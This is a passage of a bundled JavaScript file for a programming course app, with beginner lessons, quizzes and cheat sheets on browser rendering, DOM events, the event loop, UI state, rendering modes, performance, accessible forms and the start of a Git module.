VI: Hóa đơn lập dưới dạng dữ liệu điện tử, thường qua nhà cung cấp dịch vụ.`}]}]},M=Object.freeze(Object.defineProperty({__proto__:null,default:E},Symbol.toStringTag,{value:"Module"})),L={id:"frontend",title:"Browser & Frontend",emoji:"🖥️",tagline:"DOM, event loop, state — how a web page comes alive",lessons:[{id:"frontend.render",title:"How a page loads and renders",summary:"From HTML text to pixels on the screen.",minutes:4,blocks:[{type:"text",text:"The server sends HTML as plain text. The browser must turn that text into pixels. It does this in a few fixed steps, called the **rendering pipeline**."},{type:"diagram",text:`HTML ──parse──► DOM ───┐
                       ├──► Render tree
CSS ───parse──► CSSOM ─┘         │
                                 ▼
                 Layout: size and position
                                 │
                                 ▼
                 Paint: draw the pixels`},{type:"list",items:["**DOM** (Document Object Model): a tree of objects, one for each HTML element.","**CSSOM**: the same kind of tree, but for the CSS rules.","**Render tree**: only the visible elements, each with its final styles.","**Layout**: the browser works out the size and position of every box.","**Paint**: the browser draws the boxes, text and images as pixels."]},{type:"text",text:"A normal `<script>` tag stops HTML parsing. The browser downloads the script, runs it, and only then continues. This is called **render-blocking**.\nCSS also blocks the first paint. That is why you do not see a page without styles."},{type:"diagram",text:`= parse HTML   - download   # run script

normal  ===----##=====
async   =======##=====
           ----     (runs when ready)
defer   ==============##
           ----     (runs after parse)`},{type:"compare",left:{title:"async",items:["Downloads while the HTML is parsed","Runs as soon as it arrives","Order between scripts is not kept","Good for independent scripts, like analytics"]},right:{title:"defer",items:["Downloads while the HTML is parsed","Runs after HTML parsing ends","Scripts run in the order you wrote them","Good for your app code that uses the DOM"]}},{type:"example",title:"The white screen",text:"A shop page loads a 400 KB chat widget with a normal `<script>` in `<head>`. On a slow phone, the screen stays white while it downloads. With `defer`, the product list shows first. The widget starts a moment later."}],remember:"HTML → DOM, CSS → CSSOM, then layout and paint. Use `defer` so scripts do not block the page.",questions:[{id:"frontend.render.1",kind:"mcq",difficulty:"easy",prompt:"What is the DOM?",choices:["A file of styles that the server sends with the page","A tree of objects the browser builds from the HTML","The list of pixels the browser draws on the screen","A cache where the browser keeps downloaded scripts"],answer:1,why:"The browser parses the HTML into a tree of objects: the DOM. JavaScript reads and changes this tree, and the screen follows."},{id:"frontend.render.2",kind:"scenario",difficulty:"medium",prompt:"Your app script is in `<head>`. It reads elements from the page and delays the first view. What is the best fix?",choices:["Add `async`, so it runs the moment it is downloaded","Copy the whole script inline into the `<head>` tag","Add `defer`, so it runs after the HTML is parsed","Keep it, because scripts in `<head>` never block"],answer:2,why:"`defer` downloads in parallel and runs after parsing, so the elements exist. `async` may run before the elements exist, and it does not keep script order.",remember:"App scripts that use the DOM → `defer`."},{id:"frontend.render.3",kind:"truefalse",difficulty:"medium",prompt:"An element with `display: none` is in the DOM but not in the render tree.",choices:["True","False"],answer:0,why:"The DOM holds every element. The render tree holds only what is shown, so a hidden element gets no layout and no paint."},{id:"frontend.render.4",kind:"debug",difficulty:"hard",prompt:'Two scripts use `async`: `jquery.js`, and `app.js` which uses jQuery. Sometimes the console says "$ is not defined". Why?',choices:["The browser caches `jquery.js` and skips running it on the next visit","Async scripts run before the HTML exists, so `$` is removed again","jQuery cannot work with async loading, in any browser","Each async script runs when it arrives, so `app.js` may run first"],answer:3,why:"Async scripts run in the order they finish downloading, not the order in the HTML. Use `defer` on both, which keeps the order.",remember:"`async` = no order. `defer` = in order."}]},{id:"frontend.dom-events",title:"The DOM and events",summary:"Clicks travel up the tree. Use that.",minutes:4,blocks:[{type:"text",text:"The DOM is a tree. Each element is a **node**, that is, one object in the tree. JavaScript can read and change nodes, and the screen updates to match."},{type:"diagram",text:`document
└── html
    ├── head
    │   └── title
    └── body
        └── ul#cart
            ├── li "Milk"   [x]
            ├── li "Bread"  [x]
            └── li "Eggs"   [x]`},{type:"text",text:"An **event** is something that happens: a click, a key press, a form submit. A **listener** is a function you attach. It runs when the event happens."},{type:"text",text:"Events **bubble**. A click on a button fires on the button first. Then it fires on the parent, then the grandparent, up to `document`."},{type:"diagram",text:`document   ▲  5
body       │  4
ul#cart    │  3   ← one listener here
li         │  2
button [x] │  1   ← you click here`},{type:"code",code:{lang:"ts",text:`const cart = document.querySelector('#cart')!;

// One listener for all items, even new ones
cart.addEventListener('click', (e) => {
  const btn = (e.target as HTMLElement)
    .closest('button.remove');
  if (!btn) return;
  btn.closest('li')?.remove();
});`}},{type:"example",title:"A long order table",text:"An admin page shows 2,000 order rows, each with a Delete button. 2,000 listeners use extra memory. Rows added later get no listener at all. One listener on the table handles every row. This is called **event delegation**."},{type:"text",text:"`e.preventDefault()` stops the browser default action. For example, a form submit normally reloads the page.\n`e.stopPropagation()` is different. It stops the bubbling, but the default action still happens."}],remember:"Events bubble up the tree. One listener on the parent can handle all its children.",questions:[{id:"frontend.dom-events.1",kind:"code",difficulty:"medium",prompt:"The user clicks the button. What is printed?",code:{lang:"ts",text:`// <div id="box">
//   <button id="b">Go</button>
// </div>
box.addEventListener('click', () =>
  console.log('box'));
b.addEventListener('click', () =>
  console.log('button'));`},choices:["box, then button","button, then box","only button","only box"],answer:1,why:"The event fires on the clicked element first, then bubbles up to its parents. So the button listener runs before the div listener."},{id:"frontend.dom-events.2",kind:"scenario",difficulty:"medium",prompt:"A to-do list adds new items with JavaScript. Each item got its own click listener at page load. New items do not react to clicks. What is the best fix?",choices:["Reload the page each time a new item is added","Call `preventDefault()` in every item handler","Add listeners again to all items every second","Put one listener on the list and check `e.target`"],answer:3,why:"Clicks on new items bubble up to the list too. One listener on the parent covers old and new items, with no extra work.",remember:"Dynamic lists → event delegation."},{id:"frontend.dom-events.3",kind:"debug",difficulty:"easy",prompt:"A login form sends its data with `fetch`. After clicking Submit, the page reloads and the result is lost. What is missing?",choices:["`e.stopPropagation()` in the submit handler","`e.preventDefault()` in the submit handler","A `defer` attribute on the form script tag","An `async` keyword on the submit handler"],answer:1,why:"The default action of a form submit is to send the form and load a new page. `preventDefault()` stops that, so your `fetch` code can handle it."},{id:"frontend.dom-events.4",kind:"truefalse",difficulty:"hard",prompt:"Calling `e.stopPropagation()` in a submit handler stops the form from being submitted.",choices:["True","False"],answer:1,why:"It only stops the event from bubbling to the parents. The default action still happens. To stop the submit, call `preventDefault()`."}]},{id:"frontend.event-loop",title:"The JavaScript event loop",summary:"One thread, two queues, and why pages freeze.",minutes:5,blocks:[{type:"text",text:"JavaScript in a page runs on **one main thread**. It does one thing at a time. The same thread also handles clicks and updates the screen."},{type:"diagram",text:`┌─────────────┐
│ Call stack  │ ◄── runs one function
└──────▲──────┘     at a time
       │ when the stack is empty:
       │ 1. run ALL microtasks
       │ 2. maybe update the screen
       │ 3. take ONE task, repeat
┌──────┴───────┐   ┌──────────────┐
│ Microtasks   │   │ Tasks        │
│ Promise.then │   │ setTimeout   │
│ after await  │   │ clicks       │
└──────────────┘   └──────────────┘`},{type:"list",items:["**Call stack**: the functions that are running right now.","**Task queue**: callbacks waiting for their turn. For example, `setTimeout` callbacks and click handlers.","**Microtask queue**: promise callbacks, like `.then` and the code after `await`. They run before the next task.","**Event loop**: the rule that moves work from the queues to the stack."]},{type:"code",code:{lang:"ts",text:`console.log('A');
setTimeout(() => console.log('B'), 0);
Promise.resolve().then(() => console.log('C'));
console.log('D');
// Output: A D C B`}},{type:"text",text:"Why this order? A and D are normal code, so they run first. C is a microtask, so it runs as soon as the stack is empty. B is a task. It waits, even with a 0 ms delay."},{type:"example",title:"The frozen report page",text:"A report page sorts 500,000 rows in one loop. It takes 4 seconds. During that time the stack is never empty. Clicks wait, and the screen does not update. The user thinks the app crashed."},{type:"text",text:"Fixes: do heavy work on the server, or in a **Web Worker** (a background thread for JavaScript). Or split it into small chunks.\nNote: `async` and promises do **not** create a new thread."}],remember:"Normal code first, then all microtasks, then the next task. A long loop blocks everything.",questions:[{id:"frontend.event-loop.1",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"ts",text:`console.log(1);
setTimeout(() => console.log(2), 0);
Promise.resolve()
  .then(() => console.log(3));
console.log(4);`},choices:["1 2 3 4","1 4 2 3","1 4 3 2","1 3 4 2"],answer:2,why:"1 and 4 are normal code. Then the stack is empty, so the microtask (3) runs. The `setTimeout` task (2) runs last.",remember:"Sync → microtasks → tasks."},{id:"frontend.event-loop.2",kind:"perf",difficulty:"easy",prompt:'Clicking "Export" runs a loop over 1 million rows in the browser. The page freezes for 5 seconds. Buttons do not respond. Why?',choices:["The loop keeps the main thread busy, so clicks wait","The browser allows only one click per second on a page","The promises on the page are waiting for a server reply","The CSS file is too large, so the browser stops painting"],answer:0,why:"Click handlers and screen updates need the main thread. While the loop runs, they wait in the queue."},{id:"frontend.event-loop.3",kind:"truefalse",difficulty:"medium",prompt:"`setTimeout(fn, 0)` runs `fn` right away, before the next line of code.",choices:["True","False"],answer:1,why:"It only puts `fn` in the task queue. It runs after the current code ends and after all microtasks."},{id:"frontend.event-loop.4",kind:"scenario",difficulty:"hard",prompt:"You must parse a 50 MB file in the browser without freezing the page. Which is the best choice?",choices:["Put the parse loop in an `async` function so it runs in the background","Wrap the loop in `Promise.resolve().then(...)`","Parse it in a Web Worker and send the result back","Use `setTimeout(parse, 0)` to run it a bit later"],answer:2,why:"`async`, promises and `setTimeout` still run the loop on the main thread, just later. A Web Worker runs it on a separate thread.",remember:"Async is not a background thread."}]},{id:"frontend.state",title:"UI = f(state)",summary:"Keep one source of truth. Compute the rest.",minutes:4,blocks:[{type:"text",text:"**State** is data that can change while the page is open. For example: the cart items, the logged-in user, the search text."},{type:"text",text:"Libraries like React follow one idea: the screen is a **function of the state**. You change the state. The library redraws the parts that changed."},{type:"diagram",text:`     ┌─────────┐
 ┌──►│  State  │  items: [Milk, Eggs]
 │   └────┬────┘
 │        │ render
 │        ▼
 │   ┌─────────┐
 │   │   UI    │  "Cart (2)"
 │   └────┬────┘
 │        │ user clicks "Remove"
 │        ▼
 │   ┌─────────┐
 └───┤  Event  │  setItems(newItems)
     └─────────┘`},{type:"text",text:"Data flows **one way**: state → UI → event → new state. The UI never changes itself directly."},{type:"compare",left:{title:"Copied state ⚠️",items:["Store `items` and also `count`","Two values must be kept in sync by hand","Miss one update and they disagree"]},right:{title:"Derived state ✅",items:["Store only `items`","Compute `count` from `items` when rendering","One **source of truth**: nothing can disagree"]}},{type:"code",code:{lang:"ts",text:`function Cart() {
  const [items, setItems] =
    useState<string[]>([]);
  // derived: computed, not stored
  const count = items.length;

  const remove = (name: string) =>
    setItems(items.filter(i => i !== name));

  return <p>Cart ({count})</p>;
}`}},{type:"example",title:"The double count bug",text:"A shop stores `cartCount` and `cartItems` as two separate states. The Remove button updates the items but forgets the count. The header says 3 items, the cart shows 2. Deriving the count from the items removes this kind of bug."},{type:"text",text:"Do not change state in place. Create a new array or object instead. React checks if the value is the same object. If you `push` into the same array, React may skip the redraw."}],remember:"Keep one source of truth. Compute everything else from it.",questions:[{id:"frontend.state.1",kind:"mcq",difficulty:"easy",prompt:'What does "UI = f(state)" mean?',choices:["Each UI element must be written as a separate function","The state is computed from what is on the screen","The screen is computed from the current state","The UI must be redrawn from scratch every second"],answer:2,why:"You describe how the screen looks for a given state. When the state changes, the library updates the screen to match."},{id:"frontend.state.2",kind:"debug",difficulty:"medium",prompt:'Clicking "Add" does not show the new item. Why?',code:{lang:"ts",text:`const [todos, setTodos] =
  useState<string[]>([]);

function add(text: string) {
  todos.push(text);
  setTodos(todos);
}`},choices:["`push` is not allowed on arrays inside a component","The same array is passed back, so React sees no change","`setTodos` only works with numbers and strings","The item is added, but React needs a page reload"],answer:1,why:"React compares the old and new value. It is the same array object, so React skips the re-render. Write `setTodos([...todos, text])` instead.",remember:"New state = new object, not a changed old one."},{id:"frontend.state.3",kind:"compare",difficulty:"medium",prompt:"A form shows `firstName`, `lastName` and `fullName`. Which design is better?",choices:["Store all three and update `fullName` in every change handler","Store first and last name, and compute `fullName` when rendering"],answer:1,why:"`fullName` comes from the other two. If you store it too, one missed update makes it wrong. Computing it keeps one source of truth."},{id:"frontend.state.4",kind:"scenario",difficulty:"hard",prompt:"A product list and a filter panel each keep their own copy of the products. After a price update, the two show different prices. What is the best fix?",choices:["Sync the two copies with a timer every 500 ms","Keep one product list and derive the filtered list from it","Reload both lists from the server on every key press","Add a Refresh button so users can fix it themselves"],answer:1,why:"Two copies of the same data will drift apart. One list plus a computed filter means there is nothing to keep in sync.",remember:"Copies drift. Derive instead."}]},{id:"frontend.rendering-modes",title:"Client vs server rendering",summary:"CSR, SSR, SSG and hydration.",minutes:4,blocks:[{type:"text",text:`Someone must turn data into HTML. It can happen in the browser or on the server. The choice changes speed, SEO and cost.
**SEO** (search engine optimization) means search engines can find and read your pages.`},{type:"list",items:["**CSR** (client-side rendering): the server sends an almost empty page plus JavaScript. The browser builds the page.","**SSR** (server-side rendering): the server builds the full HTML for each request.","**SSG** (static site generation): the HTML is built once, at build time, and served as files.","**Hydration**: JavaScript loads and attaches event handlers to the server HTML. Then the page reacts to clicks."]},{type:"diagram",text:`CSR  browser: empty page
            → download JS
            → fetch data → build page
            content shows: LATE

SSR  server:  fetch data → build HTML
     browser: show HTML     content: EARLY
            → download JS → hydrate
            clicks work: after hydrate

SSG  build:   HTML made once → CDN
     browser: show HTML     content: FAST
            → download JS → hydrate`},{type:"text",text:"A **CDN** (content delivery network) is a group of servers close to users. It serves static files quickly."},{type:"compare",left:{title:"CSR",items:["Blank page until the JS runs","Search engines may see less content","Cheap: only static files and an API","Fine for apps behind a login"]},right:{title:"SSR / SSG",items:["Content shows on the first response","Better for SEO and link previews","SSR needs a server to render each request","SSG is cheap, but data is only as new as the last build"]}},{type:"example",title:"Pick per page",text:"An online shop uses SSG for help pages, because they rarely change. Product pages use SSR, so prices are fresh and search engines can read them. The admin dashboard uses CSR, because it is behind a login."},{type:"text",text:"Watch out: with SSR, the page is visible before hydration ends. A button can show on screen but not react to clicks yet."}],remember:"CSR builds in the browser, SSR on each request, SSG at build time. Hydration makes server HTML clickable.",questions:[{id:"frontend.rendering-modes.1",kind:"mcq",difficulty:"easy",prompt:"What is hydration?",choices:["The server converting JSON data into a database table","The browser downloading images before the HTML arrives","A CDN copying static files to servers around the world","JavaScript attaching event handlers to server-made HTML"],answer:3,why:"The server sends ready HTML, but it has no event handlers yet. Hydration connects the JavaScript to that HTML, so clicks work."},{id:"frontend.rendering-modes.2",kind:"scenario",difficulty:"medium",prompt:"A news site gets most visitors from search engines. Its pages are pure CSR and load slowly on phones. What is the best change?",choices:["Render the articles on the server, with SSR or SSG","Add more JavaScript to show a nice loading spinner","Move the whole site to a bigger API server","Ask users to install a faster web browser"],answer:0,why:"SSR or SSG sends full HTML, so the text shows early and search engines can read it. A spinner fixes neither problem."},{id:"frontend.rendering-modes.3",kind:"compare",difficulty:"medium",prompt:"A company blog changes once a week. Which fits best?",choices:["SSR: build each page on the server for every request","SSG: build the pages once and serve them as static files"],answer:1,why:"The content rarely changes, so building it on every request wastes server work. SSG files are fast and cheap to serve from a CDN.",remember:"Rarely changes → SSG."},{id:"frontend.rendering-modes.4",kind:"debug",difficulty:"hard",prompt:'An SSR page shows a "Buy" button quickly. On slow phones, the first taps do nothing for 2 to 3 seconds. Then it works. What is the likely cause?',choices:["The server sent the HTML twice, so the browser ignores clicks","Hydration has not finished, so no click handler is attached yet","The button calls `preventDefault()` on the first click only","The CDN blocks clicks until its page cache is ready"],answer:1,why:"The HTML is visible before the JavaScript has loaded and hydrated it. Until then the button is just HTML with no handler. Smaller bundles shorten this gap."}]},{id:"frontend.performance",title:"Frontend performance",summary:"Send less, load later, cache well.",minutes:5,blocks:[{type:"text",text:`Big JavaScript files take time to download, parse and run. On a cheap phone with a slow network, this can take seconds.
A **bundle** is the combined JavaScript file your build tool makes.`},{type:"diagram",text:`Before: one bundle
┌──────────────────────────────┐
│ app.js  2.1 MB               │
│ home + admin + charts + PDF  │
└──────────────────────────────┘

After: code splitting
┌──────────┐ ┌──────────┐ ┌──────────┐
│ main.js  │ │ admin.js │ │charts.js │
│ 300 KB   │ │ 400 KB   │ │ 900 KB   │
└──────────┘ └──────────┘ └──────────┘
 load now     load only when needed`},{type:"text",text:"**Code splitting** cuts the bundle into pieces. **Lazy loading** downloads a piece only when the user needs it."},{type:"code",code:{lang:"ts",text:`// Downloaded only when Reports is shown
const Reports = lazy(
  () => import('./Reports'));`}},{type:"list",items:["**Image size**: send the size you show. Do not send a 4000 px photo for a 300 px box.","**Image format**: WebP and AVIF are often much smaller than JPEG or PNG.",'**Lazy images**: add `loading="lazy"` to images that are only visible after scrolling.',"**Hashed names**: a file like `app.3f9a1c.js` can be cached for a year. A new build gets a new name."]},{type:"code",code:{lang:"http",text:`GET /assets/app.3f9a1c.js
Cache-Control: max-age=31536000, immutable

GET /index.html
Cache-Control: no-cache`}},{type:"text",text:`The HTML is checked every time, so it always points to the newest file names. The hashed files never change, so they can be cached for a long time.
**Core Web Vitals** are three numbers that measure how a page feels to users:`},{type:"list",items:["**LCP** (Largest Contentful Paint): how fast the main content shows. Good: 2.5 s or less.","**INP** (Interaction to Next Paint): how fast the page reacts to clicks and taps. Good: 200 ms or less.","**CLS** (Cumulative Layout Shift): how much the content jumps while loading. Good: 0.1 or less."]},{type:"example",title:"The jumping button",text:'A user wants to tap "Cancel". An ad image with no set height loads above it. The page jumps down, and the user taps "Buy" instead. That is a bad CLS. Fix: give images and ads a fixed size.'}],remember:"Ship less JavaScript, load the rest when needed, size your images, and cache hashed files.",questions:[{id:"frontend.performance.1",kind:"perf",difficulty:"medium",prompt:"The home page downloads a 3 MB bundle. Most of it is a chart library used only on the Reports page. What is the best first fix?",choices:["Minify the CSS files so the page downloads less","Add `defer` to the image tags on the home page","Lazy-load the Reports page, so chart code loads there","Move the chart library to a separate CDN domain"],answer:2,why:"Most of the bundle is code the home page never uses. Code splitting moves it into a piece that loads only on Reports.",remember:"Do not ship code the page does not use."},{id:"frontend.performance.2",kind:"debug",difficulty:"medium",prompt:"You deploy a fix to `app.js`. Some users still see the old bug for days. The file is cached with a `max-age` of one year. What went wrong?",choices:["The file name has no hash, so browsers keep the old copy","The server must restart before browsers see new files","The CDN only updates files once per week by default","Browsers never cache JavaScript, so the bug is elsewhere"],answer:0,why:"Long caching is safe only when the name changes with the content. With a hash like `app.3f9a1c.js`, a new build means a new URL."},{id:"frontend.performance.3",kind:"scenario",difficulty:"medium",prompt:"Users say the page jumps while it loads. Then they tap the wrong link. Which metric is bad, and what is a common fix?",choices:["LCP: make the largest image smaller and faster","INP: split long JavaScript tasks into small ones","CLS: reserve space for images and ads with set sizes","SEO: render the page on the server with SSR"],answer:2,why:"Content that moves after it appears is layout shift, measured by CLS. Setting `width` and `height` lets the browser keep the space free."},{id:"frontend.performance.4",kind:"mcq",difficulty:"hard",prompt:"A button click starts 600 ms of JavaScript before the screen changes. Which Core Web Vital gets worse?",choices:["LCP","INP","CLS"],answer:1,why:"INP measures the delay from a click or tap to the next paint. Good is 200 ms or less. LCP is about the first load, and CLS is about jumping content."}]},{id:"frontend.forms-a11y",title:"Forms, validation and accessibility",summary:"Check twice, label everything, think phone first.",minutes:5,blocks:[{type:"text",text:'**Client validation** checks input in the browser. It gives fast feedback, like "Email is required". It is for user comfort, not for safety.'},{type:"diagram",text:`Browser                     Server
┌─────────────────┐        ┌──────────────┐
│ required, min=1 │ POST   │ check AGAIN  │
│ fast feedback   │───────►│ then save    │
└─────────────────┘        └──────────────┘
                                ▲
  attacker skips the browser:   │
  curl -X POST ... qty=-5 ──────┘`},{type:"text",text:"Anyone can skip your JavaScript. They can send a request with `curl`, or change it in the browser DevTools. So the **server must validate again**."},{type:"text",text:"**Accessibility** (often written **a11y**) means everyone can use the page. That includes people who only use a keyboard. It also includes users of a **screen reader**, that is, software that reads the page aloud."},{type:"list",items:["**Labels**: every input needs a `<label>`. Screen readers read it, and a click on it focuses the input.","**Keyboard**: every action must work with Tab and Enter. Use a real `<button>`, not a clickable `<div>`.",'**Alt text**: describe what an image means. Use `alt=""` for pure decoration.',"**Color contrast**: text must stand out from its background. Never show meaning by color alone."]},{type:"code",code:{lang:"html",text:`<label for="email">Email</label>
<input id="email" type="email" required>

<img src="sales.png"
     alt="Sales rose 20% in March">`}},{type:"text",text:"Most users are on phones. Add the viewport tag, so the phone does not show a tiny desktop page. Use flexible widths like `%` and `max-width`, not fixed pixel widths."},{type:"code",code:{lang:"text",text:`<meta name="viewport"
  content="width=device-width, initial-scale=1">

img { max-width: 100%; height: auto; }`}},{type:"example",title:"The booking form nobody could use",text:"A clinic booking form used a date picker built from `<div>` tags. It worked only with a mouse. Keyboard and screen reader users could not book at all. Rebuilding it with real buttons and labels fixed it."}],remember:"Client checks are for comfort, server checks are for safety. Label inputs, support the keyboard, design for phones.",questions:[{id:"frontend.forms-a11y.1",kind:"scenario",difficulty:"easy",prompt:'The order form blocks a quantity below 1 with `min="1"`. Do you still need a check on the server?',choices:["No, the browser always enforces the `min` rule","No, if the form also has JavaScript validation","Only if the site must support old browsers","Yes, requests can be sent without your form"],answer:3,why:"Anyone can send a request with `curl` or change it in DevTools. The browser check is skipped. Only the server check protects your data.",remember:"Never trust the client."},{id:"frontend.forms-a11y.2",kind:"debug",difficulty:"medium",prompt:'A screen reader user says the signup form sounds like "edit text, edit text, edit text". What is most likely missing?',choices:["A `placeholder` color with more contrast","`<label>` elements linked to each input","The `required` attribute on each input",'A `type="submit"` on the sign-up button'],answer:1,why:"Without a label, the screen reader cannot say what each box is for. Link them with `for` and `id`. Placeholder text is not a reliable label."},{id:"frontend.forms-a11y.3",kind:"compare",difficulty:"medium",prompt:'You need a clickable "Delete" control. Which is better?',choices:['`<div class="btn">Delete</div>` with a click handler',"`<button>Delete</button>` with a click handler"],answer:1,why:"A real button gets keyboard focus, Enter and Space, and a role for screen readers for free. A div needs all of that added by hand.",remember:"Use the real element."},{id:"frontend.forms-a11y.4",kind:"truefalse",difficulty:"medium",prompt:"On a phone, a page without the viewport meta tag usually shows as a small, zoomed-out desktop page.",choices:["True","False"],answer:0,why:"Without it, mobile browsers assume a wide desktop width and shrink the page to fit. `width=device-width` makes the layout use the real screen width."}]}],cheatSheet:[{title:"Page loading",items:[{term:"DOM",meaning:"Tree of objects built from the HTML"},{term:"CSSOM",meaning:"Tree of CSS rules"},{term:"Render tree",meaning:"Visible elements with their final styles"},{term:"Layout → Paint",meaning:"Work out sizes and positions, then draw pixels"},{term:"<script defer>",meaning:"Downloads in parallel, runs after parsing, keeps order"},{term:"<script async>",meaning:"Downloads in parallel, runs when ready, no order"}]},{title:"Events and the event loop",items:[{term:"Bubbling",meaning:"An event fires on the target, then on each parent"},{term:"Event delegation",meaning:"One listener on the parent handles all children"},{term:"preventDefault()",meaning:"Stop the default action, like a form reload"},{term:"stopPropagation()",meaning:"Stop bubbling; the default action still happens"},{term:"Microtask",meaning:"Promise callback; runs before the next task"},{term:"Task",meaning:"`setTimeout` or click callback; one per loop turn"},{term:"Web Worker",meaning:"Background thread for heavy work"}]},{title:"State and rendering",items:[{term:"UI = f(state)",meaning:"The screen is computed from the state"},{term:"Source of truth",meaning:"Store each fact once; derive the rest"},{term:"One-way data flow",meaning:"State → UI → event → new state"},{term:"CSR",meaning:"Browser builds the page; slow first view"},{term:"SSR",meaning:"Server builds HTML per request; fast first view"},{term:"SSG",meaning:"HTML built once at build time; cheap and fast"},{term:"Hydration",meaning:"JS attaches handlers to server HTML"}]},{title:"Performance",items:[{term:"Code splitting",meaning:"Cut the bundle into pieces"},{term:"Lazy loading",meaning:"Load a piece only when it is needed"},{term:"app.3f9a1c.js",meaning:"Hashed name → safe to cache for a year"},{term:"LCP ≤ 2.5 s",meaning:"Main content shows fast"},{term:"INP ≤ 200 ms",meaning:"Page reacts fast to clicks and taps"},{term:"CLS ≤ 0.1",meaning:"Content does not jump while loading"}]},{title:"Forms and accessibility",items:[{term:"Client validation",meaning:"Fast feedback only; easy to skip"},{term:"Server validation",meaning:"Always needed; the real protection"},{term:"<label for>",meaning:"Tells screen readers what an input is"},{term:"alt text",meaning:"What the image means; empty for decoration"},{term:"<button>",meaning:"Keyboard and screen reader support for free"},{term:"viewport meta",meaning:"Use the real phone width, not a desktop width"}]}]},W=Object.freeze(Object.defineProperty({__proto__:null,default:L},Symbol.toStringTag,{value:"Module"})),B={id:"git",title:"Git & Teamwork",emoji:"🌿",tagline:"Commits, branches, merges — work together without losing code",lessons:[{id:"git.commits",title:"Three areas and the commit",summary:"Where your changes live before they are saved.",minutes:4,blocks:[{type:"text",text:`**Git** keeps the history of your project. Every saved version is a **commit**.
A change moves through three areas before it becomes part of history.`},{type:"diagram",text:`Working directory   your files on disk
      │
      │  git add
      ▼
Staging area        what goes into
      │             the next commit
      │  git commit
      ▼
Repository          saved history
                    (the .git folder)`},{type:"text",text:"The **staging area** is a waiting room. You choose which changes go into the next commit. Other changes stay in your files, not committed."},{type:"text",text:"A **commit** is a snapshot of all tracked files. It also stores the author, the time, a message and its **parent** (the commit before it).\nEach commit has an id called a **hash**, like `4c5d6e7`."},{type:"diagram",text:`a1b2c3d ◄── 9f8e7d6 ◄── 4c5d6e7
"Add cart"  "Fix tax"   "Add VAT"
                            ▲
                           main
arrow = "my parent is"`},{type:"code",code:{lang:"bash",text:`git status          # what changed?
git diff            # changes not staged yet
git add cart.ts     # stage one file
git diff --staged   # what will be committed
git commit -m "Fix tax rounding in cart"
git log --oneline   # short history`}},{type:"example",title:"Only commit the fix",text:"You fix a tax bug in `cart.ts`. You also added debug logs in `api.ts` to find it. You stage only `cart.ts` and commit. The logs stay on your disk and never reach the team."}],remember:"Edit → `git add` (stage) → `git commit` (snapshot with a parent and a hash).",questions:[{id:"git.commits.1",kind:"mcq",difficulty:"easy",prompt:"What does `git add cart.ts` do?",choices:["Sends cart.ts to the shared server for the team","Puts the current cart.ts changes into the next commit","Creates a new commit that contains only cart.ts","Starts tracking cart.ts but ignores its changes"],answer:1,why:"`git add` copies the change into the staging area. Nothing is saved in history until `git commit`, and nothing reaches the server until `git push`."},{id:"git.commits.2",kind:"scenario",difficulty:"medium",prompt:"You changed `cart.ts` (a real fix) and `debug.ts` (temporary logs). You want a commit with only the fix. What do you do?",choices:["Run `git add .` and then `git commit`","Run `git add cart.ts` and then `git commit`","Run `git commit` first, then `git add cart.ts`","Delete `debug.ts`, then run `git add .`"],answer:1,why:"Staging only `cart.ts` keeps the logs out of the commit. `git add .` stages everything in the folder, including the debug file.",remember:"Stage on purpose. Check `git status` before you commit."},{id:"git.commits.3",kind:"code",difficulty:"medium",prompt:"You run these steps. What does the new commit contain?",code:{lang:"bash",text:`# edit price.ts: rate = 1.08 -> 1.10
git add price.ts
# edit price.ts again: add rounding
git commit -m "Change VAT rate"`},choices:["Both edits, because commit takes the file as it is on disk now","Only the rate change; the rounding edit is still not staged","Only the rounding edit, because it is the most recent change","Nothing, because the file changed after it was staged"],answer:1,why:"`git add` stages the file as it was at that moment. The later edit stays in the working directory until you add it again.",remember:"Commit saves what is staged, not what is on disk."},{id:"git.commits.4",kind:"truefalse",difficulty:"medium",prompt:"A commit stores only the lines you changed, not the state of the whole project.",choices:["True","False"],answer:1,why:"A commit is a snapshot of all tracked files. Git reuses the data of files that did not change, so snapshots stay cheap."}]},{id:"git.branches",title:"Branches are pointers",summary:"A branch is just a name on a commit.",minutes:4,blocks:[{type:"text",text:`A **branch** is a movable label that points to one commit. It is not a copy of your files.
When you commit, the label of your current branch moves to the new commit.`},{type:"text",text:'**HEAD** means "where I am now". Usually it points to the branch you have checked out.'},{type:"diagram",text:`A──B──C              main
      └──D──E        feature ◄ HEAD

commit F on feature:
A──B──C              main
      └──D──E──F     feature ◄ HEAD`},{type:"code",code:{lang:"bash",text:`git switch -c feature/vat  # create + switch
git switch main            # go back to main
git branch                 # list local branches
git fetch origin           # download only
git pull                   # fetch + merge
git push -u origin feature/vat`}},{type:"text",text:"The shared server copy is called a **remote**. Its usual name is `origin`.\n`origin/main` is your local record of where `main` was on the server at your last fetch."},{type:"diagram",text:` Your laptop             Server (origin)
┌─────────────┐  fetch  ┌──────────┐
│ origin/main │◄────────│ main     │
│ main        │         │          │
│             │────────►│          │
└─────────────┘  push   └──────────┘`},{type:"list",items:["**fetch** — download new commits and move `origin/main`. Your branches and files do not change.","**pull** — fetch, then merge (or rebase) the new commits into your current branch.","**push** — upload your commits and move the branch on the server."]},{type:"example",title:"Two people, one main",text:"Anna pushes a fix to `main` at 10:00. At 10:30 Ben still sees the old `origin/main`. His laptop has not asked the server yet. After `git fetch`, Ben can see her commit."}],remember:"Branch = a label on a commit. fetch looks, pull brings in, push sends out.",questions:[{id:"git.branches.1",kind:"mcq",difficulty:"easy",prompt:"What is a branch in Git?",choices:["A full copy of the project folder on disk","A movable name that points to one commit","A list of files that belong to one feature","A locked area that only one person can edit"],answer:1,why:"A branch is only a pointer to a commit. That is why creating one is instant, even in a big project."},{id:"git.branches.2",kind:"scenario",difficulty:"medium",prompt:"You are on `main` and run `git fetch`. A teammate pushed 3 new commits. What changes on your laptop?",choices:["Your `main` moves forward and your files update","`origin/main` moves forward; your `main` and files stay","Nothing changes until you run `git push` as well","Git merges the commits and asks for a message"],answer:1,why:"Fetch only downloads and updates the remote-tracking branch `origin/main`. To bring the commits into your `main`, you merge or pull.",remember:"fetch is always safe: it changes nothing you work on."},{id:"git.branches.3",kind:"truefalse",difficulty:"easy",prompt:"Creating a new branch makes a copy of every file in the project.",choices:["True","False"],answer:1,why:"Git only writes a small pointer to the current commit. The files are shared with the history that already exists."},{id:"git.branches.4",kind:"debug",difficulty:"medium",prompt:"`git push` fails with: `Updates were rejected because the remote contains work that you do not have locally`. What is the most likely cause?",choices:["Your login to the server has expired","Someone pushed new commits to that branch first","Your branch name has a typo, so it does not exist","Your 